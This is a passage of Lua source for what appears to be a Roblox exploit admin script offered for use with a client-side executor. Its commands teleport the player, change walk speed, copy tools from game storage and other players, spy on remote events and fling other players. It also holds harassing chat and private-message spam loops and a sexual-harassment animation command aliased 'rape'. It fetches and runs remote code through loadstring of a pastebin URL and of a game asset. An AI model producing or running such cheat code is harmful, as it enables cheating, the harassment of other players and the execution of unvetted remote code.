	if Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
		Players.LocalPlayer.Character.Humanoid.HipHeight = args[1]
	end
end)

addcmd('dance',{},
function(args, speaker)
	if not r15(Players.LocalPlayer) then
		local pchar=Players.LocalPlayer.Character
			local anim = nil		
			local dance1 = math.random(1,7)
			if dance1 == 1 then
			anim = '27789359'
			end
			if dance1 == 2 then
			anim = '30196114'
			end
			if dance1 == 3 then
			anim = '248263260'
			end
			if dance1 == 4 then
			anim = '45834924'
			end
			if dance1 == 5 then
			anim = '33796059'
			end
			if dance1 == 6 then
			anim = '28488254'
			end
			if dance1 == 7 then
			anim = '52155728'
			end
		local animation = Instance.new("Animation")
		animation.AnimationId = "rbxassetid://"..anim
		local animTrack = pchar.Humanoid:LoadAnimation(animation)
		animTrack:Play()
	else
		notify('R6 Required','This command requires the r6 rig type')
	end
end)

addcmd('nolimbs',{'rlimbs'},
function(args, speaker)
	if r15(Players.LocalPlayer) then
		for i,v in pairs(Players.LocalPlayer.Character:GetChildren()) do
			if v:IsA("BasePart") and
				v.Name == "RightUpperLeg" or
				v.Name == "LeftUpperLeg" or
				v.Name == "RightUpperArm" or
				v.Name == "LeftUpperArm" then
				v:Destroy()
			end
		end
	else
		for i,v in pairs(Players.LocalPlayer.Character:GetChildren()) do
			if v:IsA("BasePart") and
				v.Name == "Right Leg" or
				v.Name == "Left Leg" or
				v.Name == "Right Arm" or
				v.Name == "Left Arm" then
				v:Destroy()
			end
		end
	end
end)

addcmd('noarms',{'rarms'},
function(args, speaker)
	if r15(Players.LocalPlayer) then
		for i,v in pairs(Players.LocalPlayer.Character:GetChildren()) do
			if v:IsA("BasePart") and
				v.Name == "RightUpperArm" or
				v.Name == "LeftUpperArm" then
				v:Destroy()
			end
		end
	else
		for i,v in pairs(Players.LocalPlayer.Character:GetChildren()) do
			if v:IsA("BasePart") and
				v.Name == "Right Arm" or
				v.Name == "Left Arm" then
				v:Destroy()
			end
		end
	end
end)

addcmd('nolegs',{'rlegs'},
function(args, speaker)
	if r15(Players.LocalPlayer) then
		for i,v in pairs(Players.LocalPlayer.Character:GetChildren()) do
			if v:IsA("BasePart") and
				v.Name == "RightUpperLeg" or
				v.Name == "LeftUpperLeg" then
				v:Destroy()
			end
		end
	else
		for i,v in pairs(Players.LocalPlayer.Character:GetChildren()) do
			if v:IsA("BasePart") and
				v.Name == "Right Leg" or
				v.Name == "Left Leg" then
				v:Destroy()
			end
		end
	end
end)

addcmd('sit',{},
function(args, speaker)
	if Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
		Players.LocalPlayer.Character.Humanoid.Sit = true
	end
end)

addcmd('team',{},
function(args, speaker)
	local teamname = nil
	for a,b in pairs(game:GetService("Teams"):GetChildren()) do
		local L_name = b.Name:lower()
		local F = L_name:find(getstring(1))
		if F == 1 then
			teamname = b 
		end
	end
	Players.LocalPlayer.Team = teamname
end)

addcmd('spasm',{},
function(args, speaker)
	if not r15(Players.LocalPlayer) then
		local pchar=Players.LocalPlayer.Character
		local AnimationId = "33796059"
		SpasmAnim = Instance.new("Animation")
		SpasmAnim.AnimationId = "rbxassetid://"..AnimationId
		Spasm = pchar.Humanoid:LoadAnimation(SpasmAnim)
		Spasm:Play()
		Spasm:AdjustSpeed(99)
	else
		notify('R6 Required','This command requires the r6 rig type')
	end
end)

addcmd('unspasm',{'nospasm'},
function(args, speaker)
	Spasm:Stop()
	SpasmAnim:Destroy()
end)

addcmd('headthrow',{},
function(args, speaker)
	if not r15(Players.LocalPlayer) then
		local AnimationId = "35154961"
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://"..AnimationId
		local k = Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		k:Play(0)
		k:AdjustSpeed(1)
	else
		notify('R6 Required','This command requires the r6 rig type')
	end
end)

addcmd('animation',{'anim'},
function(args, speaker)
	if not r15(Players.LocalPlayer) then
		local pchar=Players.LocalPlayer.Character
		local AnimationId = tostring(args[1])
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://"..AnimationId
		local k = pchar.Humanoid:LoadAnimation(Anim)
		k:Play()
		if args[2] then
			k:AdjustSpeed(tostring(args[2]))
		end
	else
		notify('R6 Required','This command requires the r6 rig type')
	end
end)

addcmd('tpposition',{'tppos'},
function(args,speaker)
	if #args < 3 then return end
	local tpX,tpY,tpZ = tonumber(args[1]),tonumber(args[2]),tonumber(args[3])
	local char = Players.LocalPlayer.Character
	if char and char:FindFirstChild("HumanoidRootPart") then
		char.HumanoidRootPart.CFrame = CFrame.new(tpX,tpY,tpZ)
	end
end)

addcmd('offset',{},
function(args,speaker)
	if #args < 3 then return end
	local tpX,tpY,tpZ = tonumber(args[1]),tonumber(args[2]),tonumber(args[3])
	local char = Players.LocalPlayer.Character
	if char and char:FindFirstChild("HumanoidRootPart") then
		char.HumanoidRootPart.CFrame = char.HumanoidRootPart.CFrame + Vector3.new(tpX,tpY,tpZ)
	end
end)

addcmd('getposition',{'getpos'},
function(args,speaker)
	local char = Players.LocalPlayer.Character
	if char and char:FindFirstChild("HumanoidRootPart") then
		local pos = tostring(char.HumanoidRootPart.Position)
		notify('Current Position',pos)
	end
end)

addcmd('speed',{'ws'},
function(args, speaker)
	if Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
		Players.LocalPlayer.Character.Humanoid.WalkSpeed=tonumber(args[1])
	end
end)

addcmd('tools',{'gears'},
function(args, speaker)
	local function copy(instance)
		for i,c in pairs(instance:GetChildren())do
			if c:IsA('Tool') or c:IsA('HopperBin') then
				c:Clone().Parent = Players.LocalPlayer.Backpack
			end
			copy(c)
		end
	end
	copy(game:GetService("Lighting"))
	local function copy(instance)
		for i,c in pairs(instance:GetChildren())do
			if c:IsA('Tool') or c:IsA('HopperBin') then
			c:Clone().Parent = Players.LocalPlayer.Backpack
			end
			copy(c)
		end
	end
	copy(game:GetService("ReplicatedStorage"))
	notify('Tools','Copied tools from ReplicatedStorage and Lighting')
end)

addcmd('keeptools',{'startertools','stools','ktools'},
function(args, speaker)
	local function copy(instance)
		for i,c in pairs(instance:GetChildren())do
			if c:IsA('Tool') or c:IsA('HopperBin') then
				c:Clone().Parent = Players.LocalPlayer.StarterGear
			end
			copy(c)
        end
    end
    copy(Players.LocalPlayer.Backpack)
	local function copy(instance)
		for i,c in pairs(instance:GetChildren())do
			if c:IsA('Tool') or c:IsA('HopperBin') then
				c:Clone().Parent = Players.LocalPlayer.StarterGear
			end
			copy(c)
		end
	end
	copy(Players.LocalPlayer.Character)
	notify('Tools','Copied tools to StarterGear')
end)

addcmd('nokeeptools',{'unkeeptools','nokeeptools','nostartertools','unstartertools','nostools','unstools','noktools','unktools'},
function(args, speaker)
	for i,c in pairs(Players.LocalPlayer.StarterGear:GetChildren())do
		if c:IsA('Tool') or c:IsA('HopperBin') then c:destroy()
		end
	end
	notify('Tools','Cleared tools from StarterGear')
end)

addcmd('notools',{'rtools','clrtools','removetools'},
function(args, speaker)
	for i,v in pairs(Players.LocalPlayer.Backpack:GetDescendants()) do
		if v:IsA('Tool') or v:IsA('HopperBin') then
			v:destroy()
		end
	end
	for i,v in pairs(Players.LocalPlayer.Character:GetDescendants()) do
		if v:IsA('Tool') or v:IsA('HopperBin') then
			v:destroy()
		end
	end
	notify('Tools','Removed tools')
end)

addcmd('explorer',{'dex'},
function(args, speaker)
	local dex = loadstring(game:GetObjects("rbxassetid://418957341")[1].Source)()
	game:GetService("CoreGui").Dex.PropertiesFrame.Changed:connect(function(property)
		if property == 'Position' then
			if game:GetService("CoreGui").Dex.PropertiesFrame.Position == UDim2.new(1, -300, 0.5, 36) then
				Notification:TweenPosition(UDim2.new(1, -800, 1, Notification.Position.Y.Offset), "InOut", "Quart", 0.5, true, nil)
				Holder:TweenPosition(UDim2.new(1, -550, 1, Holder.Position.Y.Offset), "InOut", "Quart", 0.2, true, nil)
				holderOffset = -550
				notifyOffset = -800
			elseif game:GetService("CoreGui").Dex.PropertiesFrame.Position == UDim2.new(1, 30, 0.5, 36) then
				Holder:TweenPosition(UDim2.new(1, -250, 1, Holder.Position.Y.Offset), "InOut", "Quart", 0.2, true, nil)
				Notification:TweenPosition(UDim2.new(1, -500, 1, Notification.Position.Y.Offset), "InOut", "Quart", 0.5, true, nil)
				holderOffset = -250
				notifyOffset = -500
			end
		end
	end)
end)

addcmd('remotespy',{'remotes'},
function(args, speaker)
	notify('Remotespy','Printed remotes')
	function getem(o)
		for i,v in pairs(o:children())do
			if string.match(v.ClassName, "RemoteEvent") or string.match(v.ClassName, "RemoteFunction") then              
				print("Name: "..v.Name.." | ".."Type: "..v.ClassName.." | ".."Location: ".."game."..v:GetFullName())
			end
			getem(v)
		end
	end
	pcall(getem,game)
end)

loopgoto = nil
addcmd('loopgoto',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		loopgoto = Players[v]
		repeat wait() if Players[v].Character ~= nil then
			if speaker.Character:FindFirstChild("Humanoid") then
				speaker.Character.Humanoid.Jump = true
			end
			speaker.Character:MoveTo(Players[v].Character.HumanoidRootPart.Position)
		end
		until loopgoto ~= Players[v]
	end
end)

addcmd('unloopgoto',{'noloopgoto'},
function(args, speaker)
	loopgoto = nil
end)

headsitting = false
addcmd('headsit',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		headsitting = true
		Players.LocalPlayer.Character.Humanoid.Sit = true
		repeat wait()
			if Players[v].Character and Players[v].Character:FindFirstChild('HumanoidRootPart') and Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart') then
				if Players:FindFirstChild(Players[v].Name) and Players.LocalPlayer.Character.Humanoid.Sit == true then
					Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Players[v].Character.HumanoidRootPart.CFrame * CFrame.Angles(0,math.rad(0),0)* CFrame.new(0,1.6,0.4)
				else
					headsitting = false
				end
			end
		until headsitting == false
	end
end)

spamming = false
addcmd('spam',{},
function(args, speaker)
	spamming = true
	local spamstring = getstring(1)
	repeat wait(1)
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(spamstring, "All")
	until spamming == false
end)

addcmd('nospam',{'unspam'},
function(args, speaker)
	spamming = false
end)

pmspamming = {}
addcmd('pmspam',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
			if FindInTable(pmspamming, Players[v].Name) then return end
			table.insert(pmspamming, Players[v].Name)
			local pmspamstring = getstring(2)
			repeat wait(1)
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..Players[v].Name.." "..pmspamstring, "All")
			until not FindInTable(pmspamming, Players[v].Name)
		end)
	end
end)

addcmd('nopmspam',{'unpmspam'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
			for a,b in pairs(pmspamming) do
				if b == Players[v].Name then
					table.remove(pmspamming, a)
				end
			end
		end)
	end
end)

addcmd('blockhead',{},
function(args, speaker)
	Players.LocalPlayer.Character.Head.Mesh:Destroy()
end)

addcmd('blockhats',{},
function(args, speaker)
	for _,v in pairs(Players.LocalPlayer.Character:GetChildren()) do
		if (v:IsA("Accessory")) then
			v.Handle.Mesh:remove()
		end
	end
end)

addcmd('clone',{},
function(args, speaker)
	local AnimationId = "215384594"
	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://"..AnimationId
	local k = Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	k:Play()
	k:AdjustSpeed(100)
end)

addcmd('creeper',{},
function(args, speaker)
	if r15(Players.LocalPlayer) then
		local lol = Players.LocalPlayer
		lol.Character["Head"].Mesh:Destroy()
		lol.Character["LeftUpperArm"]:Destroy()
		lol.Character["RightUpperArm"]:Destroy()
		for i,v in pairs(Players.LocalPlayer.Character:GetDescendants()) do
			if v:IsA'Hat' or v:IsA'Accessory' then
				v.Parent = workspace
			end
		end
	else
		local lol = Players.LocalPlayer
		lol.Character["Head"].Mesh:Destroy()
		lol.Character["Left Arm"]:Destroy()
		lol.Character["Right Arm"]:Destroy()
		for i,v in pairs(Players.LocalPlayer.Character:GetDescendants()) do
			if v:IsA'Hat' or v:IsA'Accessory' then
				v.Parent = workspace
			end
		end
	end
end)

bangplr = nil

addcmd('bang',{'rape'},
function(args, speaker)
	if not r15(Players.LocalPlayer) then
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			bangAnim = Instance.new("Animation")
			bangAnim.AnimationId = "rbxassetid://148840371"
			bang = Players.LocalPlayer.Character.Humanoid:LoadAnimation(bangAnim)
			bang:Play(.1, 1, 1)
			bangplr = Players[v].Name
		end
	else
		notify('R6 Required','This command requires the r6 rig type')
	end
end)

addcmd('unbang',{'unrape'},
function(args, speaker)
	bangplr = nil
	bang:Stop()
	bangAnim:Destroy()
end)

addcmd('bringpart',{},
function(args, speaker)
	for i,v in pairs(workspace:GetDescendants()) do
		if v.Name:lower() == getstring(1):lower() and v:IsA("BasePart") then
			v.CFrame = speaker.Character.HumanoidRootPart.CFrame
		end
	end
end)

addcmd('gotopart',{},
function(args, speaker)
	for i,v in pairs(workspace:GetDescendants()) do
		if v.Name:lower() == getstring(1):lower() and v:IsA("BasePart") then
			speaker.Character.HumanoidRootPart.CFrame = v.CFrame
			wait(0.1)
		end
	end
end)

gtools = false
addcmd('grabtools',{},
function(args, speaker)
	workspace.ChildAdded:connect(function(part)
		if gtools then
			if part:IsA("Tool") then
				part.Handle.CFrame = Players.LocalPlayer.Character.HumanoidRootPart.CFrame
			end
		end
	end)
end)

addcmd('nograbtools',{'ungrabtools'},
function(args, speaker)
	gtools = false
end)

addcmd('light',{},
function(args, speaker)
	local light = Instance.new("PointLight", speaker.Character.HumanoidRootPart)
	light.Range = 30
	if args[1] then
		light.Brightness = args[1]
	else
		light.Brightness = 5
	end
end)

addcmd('unlight',{'nolight'},
function(args, speaker)
	for i,v in pairs(speaker.Character:GetDescendants()) do
		if v.ClassName == "PointLight" then
			v:Destroy()
		end
	end
end)

addcmd('givetools',{},
function(args, speaker)
	for i,t in pairs(Players.LocalPlayer.Backpack:GetDescendants()) do
		if t:IsA("Tool") then
			t.Parent = Players.LocalPlayer.Character
			wait()
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players)do
				t.Parent = Players[v].Character
			end
		end
	end
end)

addcmd('copytools',{'clonetools'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
			for i,v in pairs(Players[v].Backpack:GetChildren()) do
				if v:IsA('Tool') or v:IsA('HopperBin') then
					v:Clone().Parent = speaker.Backpack
				end
			end
		end)
	end
end)

addcmd('naked',{},
function(args, speaker)
	for i,v in pairs(Players.LocalPlayer.Character:GetDescendants()) do
		if v:IsA("Clothing") then
			v:Destroy()
		end
	end
end)

addcmd('spawnpoint',{'spawn'},
function(args, speaker)
	spawnpos = Players.LocalPlayer.Character.HumanoidRootPart.CFrame
	spawnpoint = true
	notify('Spawn Point','Spawn point created at '..tostring(spawnpos))
end)

addcmd('nospawnpoint',{'nospawn'},
function(args, speaker)
	spawnpoint = false
	notify('Spawn Point','Removed spawn point')
end)

addcmd('hatspin',{'spinhats'},
function(args, speaker)
	for i,v in pairs(Players.LocalPlayer.Character:GetDescendants()) do
		if v:IsA("Accessory") or v:IsA("Hat") then
			local keep = Instance.new("BodyPosition") keep.Parent = v.Handle keep.Name = "no"
			local spin = Instance.new("BodyAngularVelocity") spin.Parent = v.Handle spin.Name = "ha"
			if v.Handle.AccessoryWeld then
				v.Handle.AccessoryWeld:Destroy()
			end
			if args[1] then
				spin.AngularVelocity = Vector3.new(0, args[1], 0)
				spin.MaxTorque = Vector3.new(0, args[1] * 2, 0)
			else
				spin.AngularVelocity = Vector3.new(0, 100, 0)
				spin.MaxTorque = Vector3.new(0, 200, 0)
			end
			keep.P = 30000
			keep.D = 50
			spinning = keep
			spinenabled = true
		end
	end
end)

addcmd('unhatspin',{'unspinhats'},
function(args, speaker)
	for i,v in pairs(Players.LocalPlayer.Character:GetDescendants()) do
		if v:IsA("Accessory") or v:IsA("Hat") then
			pcall(function()
				if v:IsA("Accessory") or v:IsA("Hat") then
					v.Parent = workspace
				end
				wait(0.5)
				v.Handle.no:Destroy()
				v.Handle.ha:Destroy()
				if v:IsA("Accessory") or v:IsA("Hat") then
					v.Parent = Players.LocalPlayer.Character
				end
			end)
		end
	end
end)

addcmd('ambient',{},
function(args, speaker)
	game:GetService("Lighting").Ambient = Color3.new(args[1],args[2],args[3])
	game:GetService("Lighting").OutdoorAmbient = Color3.new(args[1],args[2],args[3])
end)

addcmd('nofog',{},
function(args, speaker)
	game:GetService("Lighting").FogEnd = 100000
end)

addcmd('brightness',{},
function(args, speaker)
	game:GetService("Lighting").Brightness = args[1]
end)

origsettings = {abt = game:GetService("Lighting").Ambient, oabt = game:GetService("Lighting").OutdoorAmbient, brt = game:GetService("Lighting").Brightness, time = game:GetService("Lighting").TimeOfDay, fclr = game:GetService("Lighting").FogColor, fe = game:GetService("Lighting").FogEnd, fs = game:GetService("Lighting").FogStart}

addcmd('restorelighting',{'rlighting'},
function(args,speaker)
	game:GetService("Lighting").Ambient = origsettings.abt
	game:GetService("Lighting").OutdoorAmbient = origsettings.oabt
	game:GetService("Lighting").Brightness = origsettings.brt
	game:GetService("Lighting").TimeOfDay = origsettings.time
	game:GetService("Lighting").FogColor = origsettings.fclr
	game:GetService("Lighting").FogEnd = origsettings.fe
	game:GetService("Lighting").FogStart = origsettings.fs
end)

addcmd('stun',{},
function(args, speaker)
	Players.LocalPlayer.Character.Humanoid.PlatformStand = true
end)

addcmd('unstun',{'nostun'},
function(args, speaker)
	Players.LocalPlayer.Character.Humanoid.PlatformStand = false
end)

addcmd('drophats',{'drophat'},
function(args, speaker)
	if speaker.Character then
		for _,obj in pairs(speaker.Character:GetChildren()) do
			if obj:IsA("Accessory") then
				obj.Parent = workspace
			end
		end
	end
end)

addcmd('droptools',{'droptool'},
function(args, speaker)
	if speaker.Character then
		for _,obj in pairs(speaker.Character:GetChildren()) do
			if obj:IsA("Tool") then
				obj.Parent = workspace
			end
		end
	end
	if speaker:FindFirstChild("Backpack") then
		for _,obj in pairs(speaker.Backpack:GetChildren()) do
			if obj:IsA("Tool") then
				obj.Parent = workspace
			end
		end
	end
end)

addcmd('logs',{'chatlogs'},
function(args, speaker)
	logsDrag:TweenPosition(UDim2.new(0, 0, 1, -250), "InOut", "Quart", 0.3, true, nil)
end)

addcmd('fling',{},
function(args, speaker)
	for _, child in pairs(Players.LocalPlayer.Character:GetDescendants()) do
		if child.ClassName == "Part" or child.ClassName == "MeshPart" then
			child.CustomPhysicalProperties = PhysicalProperties.new(2, 0.3, 0.5)
		end
	end
	for i,v in pairs(Players.LocalPlayer.Character:GetChildren()) do
		if v:IsA('Accessory') or v:IsA('Hat') then
			for e,c in pairs(v:GetDescendants()) do
				if c:IsA('Part') or c:IsA('MeshPart') then
					c.CustomPhysicalProperties = PhysicalProperties.new(0, 0.3, 0.5)
				end
			end
		end
	end
	execCmd('noclip')
	wait(.1)
	local bambam = Instance.new("BodyAngularVelocity")
	bambam.Parent = Players.LocalPlayer.Character.HumanoidRootPart
	bambam.AngularVelocity = Vector3.new(0,311111,0)
	bambam.MaxTorque = Vector3.new(0,311111,0)
	bambam.P = math.huge
end)

addcmd('unfling',{'nofling'},
function(args, speaker)
	execCmd('clip')
	wait(.1)
	for i,v in pairs(Players.LocalPlayer.Character.HumanoidRootPart:GetChildren()) do
		if v.ClassName == 'BodyAngularVelocity' then
			v:Destroy()
		end
	end
	for _, child in pairs(Players.LocalPlayer.Character:GetDescendants()) do
		if child.ClassName == "Part" or child.ClassName == "MeshPart" then
			child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
		end
	end
end)

addcmd('spin',{},
function(args, speaker)
	spinInstance = Instance.new("Animation")
	spinInstance.AnimationId = "rbxassetid://188632011"
	spinAnim = Players.LocalPlayer.Character.Humanoid:LoadAnimation(spinInstance)
	spinAnim.Looped = true
	spinAnim:Play()
	if args[1] then
		spinAnim:AdjustSpeed(args[1])
	end
end)

addcmd('unspin',{},
function(args, speaker)
	spinInstance:Destroy()
	spinAnim:Stop()
end)

if pcall(function() loadstring(game:HttpGet(('https://pastebin.com/raw/yKieh77L'),true))() end) then
	if ver ~= Version then
		notify('Outdated','Get a new version at infyield.yolasite.com')
	end
	if Announcement and Announcement ~= '' then
		local AnnGUI = Instance.new("Frame")
		local background = Instance.new("Frame")
		local Dark = Instance.new("Frame")
		local TextBox = Instance.new("TextLabel")
		local shadow = Instance.new("Frame")
		local PopupText = Instance.new("TextLabel")
		local Exit = Instance.new("ImageButton")
		
		AnnGUI.Name = randomString()
		AnnGUI.Parent = PARENT
		AnnGUI.Active = true
		AnnGUI.BackgroundColor3 = Color3.new(1, 1, 1)
		AnnGUI.BackgroundTransparency = 1
		AnnGUI.Position = UDim2.new(0.5, -180, 0, -400)
		AnnGUI.Size = UDim2.new(0, 360, 0, 20)
		AnnGUI.ZIndex = 4
		
		background.Name = "background"
		background.Parent = AnnGUI
		background.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
		background.BorderSizePixel = 0
		background.Position = UDim2.new(0, 0, 0, 20)
		background.Size = UDim2.new(0, 360, 0, 116)
		
		Dark.Name = "Dark"
		Dark.Parent = background
		Dark.Active = true
		Dark.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
		Dark.BackgroundTransparency = 0.5
		Dark.BorderSizePixel = 0
		Dark.Size = UDim2.new(0, 360, 0, 5)
		
		TextBox.Parent = background
		TextBox.BackgroundColor3 = Color3.new(1, 1, 1)
		TextBox.BackgroundTransparency = 1
		TextBox.Position = UDim2.new(0.0166666675, 0, 0.103232808, 0)
		TextBox.Size = UDim2.new(0, 348, 0, 98)
		TextBox.Font = Enum.Font.SourceSans
		TextBox.FontSize = Enum.FontSize.Size18
		TextBox.TextWrapped = true
		TextBox.Text = Announcement
		TextBox.TextColor3 = Color3.new(1, 1, 1)
		TextBox.TextXAlignment = Enum.TextXAlignment.Left
		TextBox.TextYAlignment = Enum.TextYAlignment.Top
		
		shadow.Name = "shadow"
		shadow.Parent = AnnGUI
		shadow.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
		shadow.BorderColor3 = Color3.new(0, 0, 0)
		shadow.BorderSizePixel = 0
		shadow.Size = UDim2.new(0, 360, 0, 20)
		shadow.ZIndex = 4
		
		PopupText.Name = "PopupText"
		PopupText.Parent = shadow
		PopupText.BackgroundTransparency = 1
		PopupText.Position = UDim2.new(0, 51, 0, 0)
		PopupText.Size = UDim2.new(0.760355055, -16, 0.949999988, 0)
		PopupText.ZIndex = 4
		PopupText.Font = Enum.Font.SourceSans
		PopupText.FontSize = Enum.FontSize.Size24
		PopupText.Text = "Server Announcement"
		PopupText.TextColor3 = Color3.new(1, 1, 1)
		PopupText.TextStrokeTransparency = 0
		PopupText.TextWrapped = true
		
		Exit.Name = "Exit"
		Exit.Parent = shadow
		Exit.BackgroundColor3 = Color3.new(1, 1, 1)
		Exit.BackgroundTransparency = 1
		Exit.Size = UDim2.new(0, 20, 0, 20)
		Exit.ZIndex = 4
		Exit.Image = "rbxassetid://2132544126"
		
		wait(1)
		AnnGUI:TweenPosition(UDim2.new(0.5, -180, 0, 150), "InOut", "Quart", 0.5, true, nil)
		
		Exit.MouseButton1Click:Connect(function()
			AnnGUI:TweenPosition(UDim2.new(0.5, -180, 0, -400), "InOut", "Quart", 0.5, true, nil)
			wait(0.6)
			AnnGUI:Destroy()
		end)
	end
end

wait()
Credits:TweenPosition(UDim2.new(0,0,0.9,0), "Out", "Quart", 0.2)
Logo:TweenSizeAndPosition(UDim2.new(0,175,0,175),UDim2.new(0,37,0,45), "Out", "Quart", 0.3)
wait(1)
for i=1,10 do
	Logo.ImageTransparency = Logo.ImageTransparency+0.1
	IntroBackground.BackgroundTransparency = Logo.BackgroundTransparency+0.1
	wait()
end
Credits:TweenPosition(UDim2.new(0,0,0.9,30), "Out", "Quart", 0.2)
wait(0.2)
Logo:Destroy()
Credits:Destroy()
IntroBackground:Destroy()
minimizeHolder()
end)

DexV2Btn.MouseButton1Down:Connect(function()
CreateGui = function()
local NewGuiPart1 = Instance.new("ScreenGui")
local NewGuiPart2 = Instance.new("Frame")
local NewGuiPart3 = Instance.new("Frame")
local NewGuiPart4 = Instance.new("TextLabel")
local NewGuiPart5 = Instance.new("TextBox")
local NewGuiPart6 = Instance.new("Frame")
local NewGuiPart7 = Instance.new("Frame")
local NewGuiPart8 = Instance.new("TextButton")
local NewGuiPart9 = Instance.new("TextLabel")
local NewGuiPart10 = Instance.new("TextLabel")
local NewGuiPart11 = Instance.new("ImageLabel")
local NewGuiPart12 = Instance.new("Frame")
local NewGuiPart13 = Instance.new("Frame")
local NewGuiPart14 = Instance.new("Frame")
local NewGuiPart15 = Instance.new("TextButton")
local NewGuiPart16 = Instance.new("ImageLabel")
local NewGuiPart17 = Instance.new("TextButton")
local NewGuiPart18 = Instance.new("ImageLabel")
local NewGuiPart19 = Instance.new("TextButton")
local NewGuiPart20 = Instance.new("ImageLabel")
local NewGuiPart21 = Instance.new("TextButton")
local NewGuiPart22 = Instance.new("ImageLabel")
local NewGuiPart23 = Instance.new("TextButton")
local NewGuiPart24 = Instance.new("ImageLabel")
local NewGuiPart25 = Instance.new("TextButton")
local NewGuiPart26 = Instance.new("ImageLabel")
local NewGuiPart27 = Instance.new("TextButton")
local NewGuiPart28 = Instance.new("Frame")
local NewGuiPart29 = Instance.new("Frame")
local NewGuiPart30 = Instance.new("TextLabel")
local NewGuiPart31 = Instance.new("Frame")
local NewGuiPart32 = Instance.new("TextLabel")
local NewGuiPart33 = Instance.new("TextLabel")
local NewGuiPart34 = Instance.new("TextButton")
local NewGuiPart35 = Instance.new("TextLabel")
local NewGuiPart36 = Instance.new("TextLabel")
local NewGuiPart37 = Instance.new("Frame")
local NewGuiPart38 = Instance.new("Frame")
local NewGuiPart39 = Instance.new("TextLabel")
local NewGuiPart40 = Instance.new("Frame")
local NewGuiPart41 = Instance.new("TextButton")
local NewGuiPart42 = Instance.new("TextLabel")
local NewGuiPart43 = Instance.new("TextButton")
local NewGuiPart44 = Instance.new("TextBox")
local NewGuiPart45 = Instance.new("TextButton")
local NewGuiPart46 = Instance.new("TextLabel")
local NewGuiPart47 = Instance.new("TextLabel")
local NewGuiPart48 = Instance.new("Frame")
local NewGuiPart49 = Instance.new("TextLabel")
local NewGuiPart50 = Instance.new("Frame")
local NewGuiPart51 = Instance.new("TextButton")
local NewGuiPart52 = Instance.new("TextLabel")
local NewGuiPart53 = Instance.new("TextButton")
local NewGuiPart54 = Instance.new("Frame")
local NewGuiPart55 = Instance.new("TextLabel")
local NewGuiPart56 = Instance.new("Frame")
local NewGuiPart57 = Instance.new("TextLabel")
local NewGuiPart58 = Instance.new("TextButton")
local NewGuiPart59 = Instance.new("Frame")
local NewGuiPart60 = Instance.new("TextLabel")
local NewGuiPart61 = Instance.new("Frame")
local NewGuiPart62 = Instance.new("TextLabel")
local NewGuiPart63 = Instance.new("ScrollingFrame")
local NewGuiPart64 = Instance.new("TextButton")
local NewGuiPart65 = Instance.new("TextLabel")
local NewGuiPart66 = Instance.new("TextLabel")
local NewGuiPart67 = Instance.new("TextButton")
local NewGuiPart68 = Instance.new("TextButton")
local NewGuiPart69 = Instance.new("Frame")
local NewGuiPart70 = Instance.new("TextButton")
local NewGuiPart71 = Instance.new("TextBox")
local NewGuiPart72 = Instance.new("TextButton")
local NewGuiPart73 = Instance.new("TextButton")
local NewGuiPart74 = Instance.new("Frame")
local NewGuiPart75 = Instance.new("Frame")
local NewGuiPart76 = Instance.new("TextButton")
local NewGuiPart77 = Instance.new("ScrollingFrame")
local NewGuiPart78 = Instance.new("Frame")
local NewGuiPart79 = Instance.new("TextLabel")
local NewGuiPart80 = Instance.new("TextLabel")
local NewGuiPart81 = Instance.new("TextLabel")
local NewGuiPart82 = Instance.new("Frame")
local NewGuiPart83 = Instance.new("TextLabel")
local NewGuiPart84 = Instance.new("Frame")
local NewGuiPart85 = Instance.new("Frame")
local NewGuiPart86 = Instance.new("Frame")
local NewGuiPart87 = Instance.new("ImageButton")
local NewGuiPart88 = Instance.new("Frame")
local NewGuiPart89 = Instance.new("Frame")
local NewGuiPart90 = Instance.new("Frame")
local NewGuiPart91 = Instance.new("Frame")
local NewGuiPart92 = Instance.new("Frame")
local NewGuiPart93 = Instance.new("ImageButton")
local NewGuiPart94 = Instance.new("Frame")
local NewGuiPart95 = Instance.new("Frame")
local NewGuiPart96 = Instance.new("Frame")
local NewGuiPart97 = Instance.new("Frame")
local NewGuiPart98 = Instance.new("Frame")
local NewGuiPart99 = Instance.new("TextButton")
local NewGuiPart100 = Instance.new("Frame")
local NewGuiPart101 = Instance.new("Frame")
local NewGuiPart102 = Instance.new("TextButton")
local NewGuiPart103 = Instance.new("TextButton")
local NewGuiPart104 = Instance.new("TextButton")
local NewGuiPart105 = Instance.new("Frame")
local NewGuiPart106 = Instance.new("Frame")
local NewGuiPart107 = Instance.new("TextLabel")
local NewGuiPart108 = Instance.new("TextLabel")
local NewGuiPart109 = Instance.new("TextLabel")
local NewGuiPart110 = Instance.new("ImageLabel")
local NewGuiPart111 = Instance.new("Frame")
local NewGuiPart112 = Instance.new("Frame")
local NewGuiPart113 = Instance.new("TextLabel")
local NewGuiPart114 = Instance.new("Frame")
local NewGuiPart115 = Instance.new("Frame")
local NewGuiPart116 = Instance.new("TextLabel")
local NewGuiPart117 = Instance.new("TextLabel")
